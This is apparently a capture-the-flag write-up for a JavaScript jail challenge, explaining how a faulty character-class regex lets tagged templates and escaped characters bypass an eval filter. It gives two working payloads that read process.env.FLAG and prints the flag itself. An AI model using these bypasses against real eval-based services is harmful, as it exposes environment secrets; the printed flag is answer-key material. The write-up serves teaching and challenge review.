# You are being redirected

[日本語版はこちら](./README-ja.md)

## Description

Can.you.escape

## Writeup

### Overview

This is a JavaScript jail challenge where it appears that you cannot use characters other than letters, digits, or `.`.

```javascript
rl.question("> ")
  .then((input) => {
    if (!/^[.0-9A-z]+$/.test(input)) return;
    eval(input);
  })
  .finally(() => rl.close());
```

The goal is to get the `FLAG` environment variable, which can be obtained from `process.env.FLAG`.

### Vulnerability

As far as I know, there is no solution if you can really use only letters, digits, or `.`. However, there is a logic bug that relaxes this restriction.

The regular expression `[.0-9A-z]` matches `.`, digits, and **every character between `A` and `z` in ASCII**. This includes not only letters but also `` [\]^_` ``.

### Solution 1: Using tagged templates

This is progress, but the solution is still not obvious, especially because we cannot use `()` to call functions.

However, we can use [tagged templates](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#tagged_templates) to call a function using `` ` ``.

For example,

```javascript
f`Hello world!`
```

is almost the same as

```javascript
f(["Hello world!"])
```

We cannot use the `eval` function here because, according to [MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#description),

> If the argument of eval() is not a TrustedScript or string, `eval()` returns the argument unchanged. 

This means that,

```javascript
eval`3*3`
```

will return the array `["3*3"]`.

Instead, we can use the [`Function` constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function), which casts the argument to a string before parsing it as JavaScript code.

```javascript
Function`return 3*3`() == 9 // true
```

Inside the template, we can use `\` to write [escaped characters](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Character_escape). In particular, we can use `\u` or `\x` to write characters as hexadecimal Unicode code points.

The final payload looks like this: 

```javascript
Function`console.log\x28process.env.FLAG\x29```
```

### Solution 2: Using an error message

In this challenge, all error messages are also sent to the player. This means we can leak the flag if we can somehow include the value of `process.env.FLAG`.

We can do this by trying to read a property from an undefined value.

```javascript
undefined[process.env.FLAG]

/**
* <anonymous_script>:1
* undefined[process.env.FLAG]
*          ^
*
* TypeError: Cannot read properties of undefined (reading 'Alpaca{j4il.is.n0t.just.a.puzzl3}')
*     at eval (eval at <anonymous> (/app/jail.js:11:5), <anonymous>:1:10)
*     at /app/jail.js:11:5
*     at process.processTicksAndRejections (node:internal/process/task_queues:104:5)
* 
* Node.js v25.7.0
*/
```

Any undefined or null value will result in the same error message.

```javascript
null[process.env.FLAG]
Object.x[process.env.FLAG]
```

Big thanks to minaminao for providing this solution during playtesting!

## Flag

`Alpaca{j4il.is.n0t.just.a.puzzl3}`
